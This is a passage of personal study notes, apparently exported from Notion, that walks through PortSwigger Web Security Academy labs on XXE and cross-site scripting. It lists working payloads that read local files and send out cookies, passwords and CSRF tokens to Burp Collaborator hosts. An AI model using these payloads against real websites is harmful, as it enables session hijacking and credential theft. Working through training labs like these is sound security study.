+</p></details></li></ul><ul id="1c02063d-f08b-8058-816b-eb723f8fc7b0" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction">https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction</a></summary><figure id="1c02063d-f08b-8094-b202-e0b09b3eedd9" class="image"><a href="image%20185.png"><img style="width:654px" src="image%20185.png"/></a></figure><p id="1c02063d-f08b-8056-8de7-ea17aa2e9513" class="">go to the collaborator’s of burpsuite  and the pull the request</p><p id="1c02063d-f08b-800e-b432-f7cf86eee06a" class="">
+</p></details></li></ul><ul id="1c02063d-f08b-800c-9733-d8c777ee1de9" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities">https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities</a></summary><figure id="1c02063d-f08b-8022-be05-c362e515b77e" class="image"><a href="image%20186.png"><img style="width:654px" src="image%20186.png"/></a></figure><p id="1c02063d-f08b-80ff-99b2-eea7e098f627" class="">just like last lab go to the burp’s collobrator and the pull requesst</p><p id="1c02063d-f08b-80e7-b4f9-f43190b14878" class="">
+</p></details></li></ul><ul id="1c02063d-f08b-80b1-87e5-f41317721c73" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration">https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration</a></summary><figure id="1c02063d-f08b-80ad-a374-ed1b3c13f72f" class="image"><a href="image%20187.png"><img style="width:654px" src="image%20187.png"/></a></figure><p id="1c02063d-f08b-80d7-bbf1-c95db23dd6ae" class=""><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;</code><code><a href="https://exploit-0acf00060430bb6382502347011600b3.exploit-server.net/exploit">https://exploit-0acf00060430bb6382502347011600b3.exploit-server.net/exploit</a></code><code>&quot;&gt;%xxe;]&gt;</code> </p><p id="1c02063d-f08b-8082-a8c2-c6bcea6aa07b" class="">
+</p><figure id="1c02063d-f08b-8034-993f-f43560310a2a" class="image"><a href="image%20188.png"><img style="width:654px" src="image%20188.png"/></a></figure><p id="1c02063d-f08b-80f8-8fec-f1c8d9de0d8b" class=""><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;<br/>&lt;!ENTITY % stack &#x27;&lt;!ENTITY % exfil SYSTEM &quot;<br/></code><code><a href="https://fq92aoyoaxcr273x1bz4k8tih9n0b5zu.oastify.com/?test=%25file;%22">https://fq92aoyoaxcr273x1bz4k8tih9n0b5zu.oastify.com/?test=%file;&quot;</a></code><code>&gt;&#x27;&gt;<br/>%stack;<br/>%exfil;<br/></code></p><figure id="1c02063d-f08b-8008-bb74-f14af49b44ef" class="image"><a href="image%20189.png"><img style="width:654px" src="image%20189.png"/></a></figure><p id="1c02063d-f08b-8095-8d53-dc3a0d341d7a" class="">hostname </p><p id="1c02063d-f08b-805d-bbe5-e7c0e50c5991" class="">
+</p></details></li></ul><ul id="1c02063d-f08b-8047-9704-ff3fa0e69908" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages">https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages</a></summary><figure id="1c02063d-f08b-8080-9367-ddcc2e4ffbdd" class="image"><a href="image%20190.png"><img style="width:654px" src="image%20190.png"/></a></figure><p id="1c02063d-f08b-808a-a3eb-ee1d91f4d5c5" class="">
+</p><p id="1c02063d-f08b-800f-9aaf-f2929589dad6" class="">
+</p><figure id="1c02063d-f08b-80a0-9d75-cc836a545713" class="image"><a href="image%20191.png"><img style="width:654px" src="image%20191.png"/></a></figure></details></li></ul><ul id="1c02063d-f08b-8021-a5eb-d10b9897bd60" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack">https://portswigger.net/web-security/xxe/lab-xinclude-attack</a></summary><p id="1c02063d-f08b-80b1-908f-df04accc2c57" class="">
+</p><p id="1c02063d-f08b-8035-94db-c68668f296e4" class="">
+</p><p id="1c02063d-f08b-80a7-bab6-db0c2a31edc5" class="">
+</p></details></li></ul><ul id="1c02063d-f08b-809f-9284-d6fae85c3d31" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack">https://portswigger.net/web-security/xxe/lab-xinclude-attack</a></summary></details></li></ul><ul id="1c02063d-f08b-8024-a223-cefde410cb70" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload">https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload</a></summary><p id="1c02063d-f08b-8075-b9aa-fbee9c3f592d" class="">payload used</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1c02063d-f08b-802c-9da1-c00c13de6b93" class="code"><code class="language-Python">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;
+&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;
+&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre><figure id="1c02063d-f08b-8074-b28d-f011bc7dd36e" class="image"><a href="image%20192.png"><img style="width:654px" src="image%20192.png"/></a></figure><figure id="1c02063d-f08b-80fb-8991-c1cd85d6f4e7" class="image"><a href="image%20193.png"><img style="width:654px" src="image%20193.png"/></a></figure><p id="1c02063d-f08b-80d6-9484-de3732263b1d" class="">the post it click Back to Blog and open image in new tab </p><p id="1c02063d-f08b-8056-8f0a-c59ecee1fa8c" class="">
+</p><figure id="1c02063d-f08b-8036-94ce-fc6a54e3b880" class="image"><a href="image%20194.png"><img style="width:654px" src="image%20194.png"/></a></figure><figure id="1c02063d-f08b-8026-a36b-ed9a142e4918" class="image"><a href="image%20195.png"><img style="width:654px" src="image%20195.png"/></a></figure><p id="1c02063d-f08b-8061-a57f-da6f25ef2776" class="">then summit the ans.</p></details></li></ul><ul id="1c02063d-f08b-8028-b808-ddae9c7031ef" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd">https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd</a></summary></details></li></ul></details></li></ul><ul id="1c22063d-f08b-801d-a653-f9e3be43b85c" class="toggle"><li><details open=""><summary>Cross-Site Scripting</summary><ul id="1c22063d-f08b-8011-a35c-c4b0810b6fe0" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded</a></summary><figure id="1c22063d-f08b-80aa-a355-c5d8ca3eb4e4" class="image"><a href="image%20196.png"><img style="width:654px" src="image%20196.png"/></a></figure></details></li></ul><ul id="1c22063d-f08b-8051-a835-dfead9b6bbc1" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded">https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded</a></summary><figure id="1c22063d-f08b-809a-a849-ce8e77e9e668" class="image"><a href="image%20197.png"><img style="width:654px" src="image%20197.png"/></a></figure><p id="1c22063d-f08b-8023-a224-c72bddf57130" class="">post it and solved the lab</p></details></li></ul><ul id="1c22063d-f08b-8030-ad91-e5d682b50a96" class="toggle"><li><details open=""><summary><a href="https://0ae7006e042976bd80739e22007100f8.web-security-academy.net/?search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%2F%2F++%22%3E">https://0ae7006e042976bd80739e22007100f8.web-security-academy.net/?search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%2F%2F++%22%3E</a></summary><figure id="1c22063d-f08b-8065-b24f-c82ee2d6452a" class="image"><a href="image%20198.png"><img style="width:654px" src="image%20198.png"/></a></figure><p id="1c22063d-f08b-80cc-8410-f0ded47f895a" class="">
+</p><figure id="1c22063d-f08b-80e5-8558-c5322082d6d0" class="image"><a href="image%20199.png"><img style="width:653.9874877929688px" src="image%20199.png"/></a></figure></details></li></ul><ul id="1c22063d-f08b-801b-96af-f73883abe17e" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink">https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink</a></summary><figure id="1c22063d-f08b-8065-aa7a-cccc191f1df2" class="image"><a href="image%20200.png"><img style="width:654px" src="image%20200.png"/></a></figure></details></li></ul><ul id="1c22063d-f08b-80b8-8187-fadeffbc6691" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink">https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink</a></summary><figure id="1c32063d-f08b-80e8-bf12-d88bdfd6270f" class="image"><a href="image%20201.png"><img style="width:654px" src="image%20201.png"/></a></figure><p id="1c32063d-f08b-80fd-a392-f9bfe348ef60" class="">when you put <code>returnPath=javascript:alert(1)</code> in url then the website redirect you  when you click to back button on website .  because of <code>&lt;a id=&quot;backLink&quot; href=&quot;javascript:alert(1)&quot;&gt;Back&lt;/a&gt;</code>    <code>href </code> it will redirect you to another page </p><p id="1c32063d-f08b-80bd-a07d-c4c0c9bd7193" class="">example:</p><figure id="1c32063d-f08b-8078-8c2a-c925ecef5d45" class="image"><a href="image%20202.png"><img style="width:654px" src="image%20202.png"/></a></figure><p id="1c32063d-f08b-8017-80ee-f89cbf969d91" class="">then i click on back button  then it will show me this </p><figure id="1c32063d-f08b-80d3-bf2c-d19627ed9e49" class="image"><a href="image%20203.png"><img style="width:654px" src="image%20203.png"/></a></figure><p id="1c22063d-f08b-80ba-b429-eef28ce349f4" class="">it simply redirect me to the google.com</p></details></li></ul><ul id="1c32063d-f08b-802e-b75a-f6284ea5efc5" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event">https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event</a></summary><figure id="1c32063d-f08b-8007-987d-e20884422107" class="image"><a href="image%20204.png"><img style="width:653.9125366210938px" src="image%20204.png"/></a></figure><figure id="1c32063d-f08b-80b0-8617-f642a0a06ebd" class="image"><a href="image%20205.png"><img style="width:654px" src="image%20205.png"/></a></figure><p id="1c32063d-f08b-808a-9388-ecaea3cf8f1a" class="">
+</p><p id="1c32063d-f08b-808b-8586-d0109ffb4790" class="">
+</p></details></li></ul><ul id="1c32063d-f08b-800f-985f-c8a3c9a66290" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded</a></summary><figure id="1c32063d-f08b-8000-b7a9-fca5a96ecd30" class="image"><a href="image%20206.png"><img style="width:653.875px" src="image%20206.png"/></a></figure><figure id="1c32063d-f08b-8092-a074-fa369c57ae6e" class="image"><a href="image%20207.png"><img style="width:654px" src="image%20207.png"/></a></figure><p id="1c32063d-f08b-8012-8dda-ce9f4226290c" class="">
+</p></details></li></ul><ul id="1c32063d-f08b-806f-8700-f868c2ac4d66" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded</a></summary><figure id="1c32063d-f08b-8041-a389-e8ace42b0d42" class="image"><a href="image%20208.png"><img style="width:1920px" src="image%20208.png"/></a></figure></details></li></ul><ul id="1c32063d-f08b-80b9-a316-ca61b874fe33" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded</a></summary><figure id="1c32063d-f08b-8086-b220-d003d808b604" class="image"><a href="image%20209.png"><img style="width:653.9750366210938px" src="image%20209.png"/></a></figure><figure id="1c32063d-f08b-80f5-bfd8-dfddcee68163" class="image"><a href="image%20210.png"><img style="width:654px" src="image%20210.png"/></a></figure><figure id="1c32063d-f08b-8006-a7a6-d5cbb07deec8" class="image"><a href="image%20211.png"><img style="width:654px" src="image%20211.png"/></a></figure></details></li></ul><ul id="1c32063d-f08b-8003-9a5b-da71ea1d3464" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element">https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element</a></summary><figure id="1c32063d-f08b-806a-964a-cd2c74f3b18c" class="image"><a href="image%20212.png"><img style="width:791.9431762695312px" src="image%20212.png"/></a></figure><figure id="1c32063d-f08b-802b-8933-c4e8b5c7bd2d" class="image"><a href="image%20213.png"><img style="width:654px" src="image%20213.png"/></a></figure></details></li></ul><ul id="1c32063d-f08b-80b1-bd99-dde4d19551e5" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression">https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression</a></summary><figure id="1c32063d-f08b-8021-99ff-f4cf82eed4cc" class="image"><a href="image%20214.png"><img style="width:792px" src="image%20214.png"/></a></figure></details></li></ul><ul id="1c32063d-f08b-8088-8f29-c0117ae4687b" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected">https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected</a></summary><figure id="1c32063d-f08b-8033-8152-f7c4438dd6c4" class="image"><a href="image%20215.png"><img style="width:654px" src="image%20215.png"/></a></figure><p id="1c32063d-f08b-8085-ace9-fce32f470474" class="">    payload used :    <code> \&quot;};alert(1);//</code>  in search box</p><p id="1c32063d-f08b-8016-b7c8-cf76e07d99fe" class="">
+</p></details></li></ul><ul id="1c32063d-f08b-807b-bef8-cd360d9857f1" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored">https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored</a></summary><p id="1c32063d-f08b-80ec-9cd3-c1687dc490e2" class="">payload used :   <code>&lt;script&gt;&lt;img src=x onerror=alert(1)&lt;/script&gt;</code> in comment box</p></details></li></ul><ul id="1c42063d-f08b-8023-8a18-eef47aa3401f" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked</a></summary><p id="1c42063d-f08b-802c-a934-f732ec8ab724" class=""> payload used :    <code>&lt;iframe src=&quot;</code><code><a href="https://0a2700bd034ef9e382bde789002f00d5.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E">https://0a2700bd034ef9e382bde789002f00d5.web-security-academy.net/?search=&lt;body+onresize%3D&quot;print()&quot;&gt;</a></code><code>&quot;  onload=this.style.width=&#x27;100px&#x27;&gt;</code>   in body box </p></details></li></ul><ul id="1c22063d-f08b-8004-a1a6-e5f511334579" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked</a></summary><p id="1c52063d-f08b-801c-9cc4-c2fa5e6a6784" class="">
+</p><figure id="1c52063d-f08b-8099-87ba-e50a5ead5a21" class="image"><a href="image%20216.png"><img style="width:654px" src="image%20216.png"/></a></figure><p id="1c52063d-f08b-8037-9e22-d0351286d6b2" class=""><code>&lt;script&gt;<br/>location=&#x27;<br/></code><code><a href="https://0af600ea037fe7f987331a26007d00d5.web-security-academy.net/?search=%3Ctest%20id=x%20onfocus=alert(document.cookie)%20tabindex=0%3Etext%3C/test%3E#x">https://0af600ea037fe7f987331a26007d00d5.web-security-academy.net/?search=&lt;test id=x onfocus=alert(document.cookie) tabindex=0&gt;text&lt;/test&gt;#x</a></code><code>&#x27;;<br/>&lt;/script&gt;<br/></code></p></details></li></ul><ul id="1c52063d-f08b-809a-ab25-de1ef156bcad" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed</a></summary><figure id="1c52063d-f08b-80fb-b465-f31d6a527d21" class="image"><a href="image%20217.png"><img style="width:654px" src="image%20217.png"/></a></figure><p id="1c52063d-f08b-80d3-8b76-c37363d20455" class="">
+</p><p id="1c52063d-f08b-8005-b1c1-f6180061cc10" class="">payload used : <code>&lt;svg&gt;&lt;animatetransform onbegin=alert(1) attributeName=transform&gt;</code></p></details></li></ul><ul id="1c52063d-f08b-8035-a8fd-c77f7150fc20" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag</a></summary><p id="1c52063d-f08b-8055-ae63-e9cddbc7e141" class="">payload used : <code>https://&lt;linke.net/&gt;?&#x27;accesskey=&#x27;x&#x27;onclick=&#x27;alert(1)</code></p><figure id="1c52063d-f08b-8005-b5f6-eb1639e53c67" class="image"><a href="image%20218.png"><img style="width:654px" src="image%20218.png"/></a></figure><p id="1c52063d-f08b-80f6-bc52-e4d855aff30f" class="">
+</p></details></li></ul><ul id="1c52063d-f08b-8012-9dcf-ccb62634b80b" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped</a></summary><p id="1c52063d-f08b-8034-a56c-c04f59e4cdda" class="">payload used : <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p></details></li></ul><ul id="1c52063d-f08b-80b4-962e-c164269b8efa" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped</a></summary><p id="1c52063d-f08b-809e-b580-c8a0c7735846" class="">payload used :  <code>a’;alert(1);//</code></p></details></li></ul><ul id="1c52063d-f08b-8027-8ca5-da354bd05210" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped</a></summary><p id="1c52063d-f08b-8067-b1e5-f14921038542" class="">payload used : <code>http://hello?&amp;#x27;)-alert(1);// </code>   or  <code>http://hello?&amp;#x27;)-alert(1)-&amp;#x27;</code>  in website input box </p><figure id="1c52063d-f08b-80fc-85ec-f00c18db5a85" class="image"><a href="image%20219.png"><img style="width:654px" src="image%20219.png"/></a></figure></details></li></ul><ul id="1c52063d-f08b-800c-a451-ccc00a894e67" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped</a></summary><p id="1c52063d-f08b-80b9-832b-e21a945b0f6a" class="">payload used : <code>${alert(1)}</code></p></details></li></ul><ul id="1c52063d-f08b-80f3-ad1c-f8a3b35afce2" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies</a></summary><p id="1c52063d-f08b-8066-83dd-f0371952b163" class=""> payload used :</p><p id="1c52063d-f08b-807c-ac98-c1e525d0a505" class=""> <code>&lt;script&gt;fetch(&#x27;</code><code><a href="https://4oteugp29tpvyoskylxu7z5cm3sugk49.oastify.com/?cookie=%27document.cookie">https://4oteugp29tpvyoskylxu7z5cm3sugk49.oastify.com?cookie=&#x27;document.cookie</a></code><code>);&lt;/script&gt;</code>   <br/>and get the cookie from burp’s collabrotor then copy and past the session cookie into the browser(website’s) cookies<br/></p></details></li></ul><ul id="1c52063d-f08b-80e3-a467-f71f7a168d40" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords">https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords</a></summary><p id="1c52063d-f08b-802c-a0de-fbb8268873f1" class="">payload used :                                                                                                                                      <code>&lt;input id=username name=username&gt;<br/>&lt;input id=password type=password name=password onchange=&#x27;if(this.value.length) fetch(&quot;<br/></code><code><a href="https://1qsbwdrzbqrs0luh0izr9w79o0urii67.oastify.com/?username=%22+username.value+%22&amp;password=">https://1qsbwdrzbqrs0luh0izr9w79o0urii67.oastify.com?username=&quot;+username.value+&quot;&amp;password=</a></code><code>&quot;+this.value)&#x27;&gt;</code></p><figure id="1c52063d-f08b-8045-bac0-c6b5adc70183" class="image"><a href="image%20220.png"><img style="width:654px" src="image%20220.png"/></a></figure><figure id="1c52063d-f08b-803e-971c-edc374ea038c" class="image"><a href="image%20221.png"><img style="width:1952px" src="image%20221.png"/></a></figure></details></li></ul><ul id="1c52063d-f08b-809e-99cd-fac869c2f9b7" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf">https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf</a></summary><p id="1c52063d-f08b-806c-b6e7-d9c59450b021" class="">payload used /jscode : </p><p id="1c62063d-f08b-80da-ba7a-cf280bdb9ddc" class=""><code>&lt;script&gt;<br/>var req = new XMLHttpRequest();<br/>req.onload = handleResponse;<br/>req.open(&#x27;get&#x27;,&#x27;/my-account&#x27;,true);<br/>req.send();<br/>function handleResponse() {<br/>var token = this.responseText.match(/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/)[1];<br/>var changeReq = new XMLHttpRequest();<br/>changeReq.open(&#x27;post&#x27;, &#x27;/my-account/change-email&#x27;, true);<br/>changeReq.send(&#x27;csrf=&#x27;+token+&#x27;&amp;email=test@test.com&#x27;)<br/>};<br/>&lt;/script&gt;<br/></code></p></details></li></ul><ul id="1c62063d-f08b-80e7-8f79-da68b8647a6d" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings">https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings</a></summary><p id="1c62063d-f08b-8079-902d-dea7b5153590" class="">payload used : <code>toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)</code></p><p id="1c62063d-f08b-8057-be88-f6fd12550a01" class="">
+</p><figure id="1c62063d-f08b-8088-8c96-dd1b5a247e39" class="image"><a href="image%20222.png"><img style="width:654px" src="image%20222.png"/></a><figcaption>focus on the url when i put<code> http://&lt;url.net&gt;/?search=asd&amp;1%2b1=1</code>         <code>(asd&amp;1%2b1=1 =&gt;  asd&amp;1+1=1)</code>  it is showing me 2 it means here i can put my payload  </figcaption></figure><p id="1c62063d-f08b-802c-8bfd-d362b2f674fb" class="">encode the payload in to urlencoding  into url encoding</p><figure id="1c62063d-f08b-8050-9f02-f70bc0bcba22" class="image"><a href="image%20223.png"><img style="width:654px" src="image%20223.png"/></a></figure><p id="1c62063d-f08b-80f3-b07d-cbda3dad6e62" class="">
+</p><p id="1c62063d-f08b-8039-a21b-f52d764448d6" class=""><code>http://&lt;url&gt;Web-security-academy.net/?search=asd&amp;1%2b1=1</code>  </p><p id="1c62063d-f08b-800c-a505-c2c468c46596" class="">convert link this in to this by replacing   <code>1%2b1</code> to <code>%74%6f%53%74%72%69%6e%67%28%29%2e%63%6f%6e%73%74%72%75%63%74%6f%72%2e%70%72%6f%74%6f%74%79%70%65%2e%63%68%61%72%41%74%3d%5b%5d%2e%6a%6f%69%6e%3b%20%5b%31%2c%32%5d%7c%6f%72%64%65%72%42%79%3a%74%6f%53%74%72%69%6e%67%28%29%2e%63%6f%6e%73%74%72%75%63%74%6f%72%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%31%32%30%2c%36%31%2c%39%37%2c%31%30%38%2c%31%30%31%2c%31%31%34%2c%31%31%36%2c%34%30%2c%34%39%2c%34%31%29</code></p><p id="1c62063d-f08b-809c-b4a3-c98d0af13844" class="">then it will look like this .</p><p id="1c62063d-f08b-80e1-ae93-c793d7cc575d" class=""><code><strong><a href="https://0a2300e503d080168e51135a009d00ba.web-security-academy.net/?search=asd&amp;%74%6f%53%74%72%69%6e%67%28%29%2e%63%6f%6e%73%74%72%75%63%74%6f%72%2e%70%72%6f%74%6f%74%79%70%65%2e%63%68%61%72%41%74%3d%5b%5d%2e%6a%6f%69%6e%3b%20%5b%31%2c%32%5d%7c%6f%72%64%65%72%42%79%3a%74%6f%53%74%72%69%6e%67%28%29%2e%63%6f%6e%73%74%72%75%63%74%6f%72%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%31%32%30%2c%36%31%2c%39%37%2c%31%30%38%2c%31%30%31%2c%31%31%34%2c%31%31%36%2c%34%30%2c%34%39%2c%34%31%29=1">https://&lt;url&gt;.web-security-academy.net/?search=asd&amp;toString().constructor.prototype.charAt%3D[].join%3B [1%2C2]|orderBy%3AtoString().constructor.fromCharCode(120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C49%2C41)=1</a></strong></code></p><p id="1c62063d-f08b-80a6-bd22-f9b5de979ae7" class="">
+</p><p id="1c62063d-f08b-80bc-baec-ee42fc437c5d" class="">solved the lab</p><p id="1c62063d-f08b-80f5-bf68-f161141788b9" class="">
+</p><p id="1c62063d-f08b-8097-9716-d9ae5e56d956" class="">
+</p></details></li></ul><ul id="1c62063d-f08b-8089-9311-d3714fe098ea" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp">https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp</a></summary><p id="1c62063d-f08b-8016-904e-eb82bbf7acbe" class="">payload used : </p><p id="1c62063d-f08b-80cb-b74b-c1ffa61d4874" class=""><code>&lt;script&gt;<br/>location=&#x27;<br/></code><code><a href="https://0aa5009a043d7db880413a0200d000ee.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()%7CorderBy:%27(z=alert)(document.cookie)%27%3E#x">https://0aa5009a043d7db880413a0200d000ee.web-security-academy.net/?search=&lt;input id=x ng-focus=$event.composedPath()|orderBy:&#x27;(z=alert)(document.cookie)&#x27;&gt;#x</a></code><code>&#x27;;<br/>&lt;/script&gt;<br/></code></p><p id="1c62063d-f08b-80da-8094-df515cadcd4b" class="">
+</p><p id="1c62063d-f08b-80a5-83d7-cbacaf351054" class="">actual payload : <code>&lt;input id=x ng-focus=$event.composedPath()|orderBy:&#x27;(z=alert)(1)&#x27;&gt;</code></p><p id="1c62063d-f08b-8084-aef2-f0146c565fa6" class="">
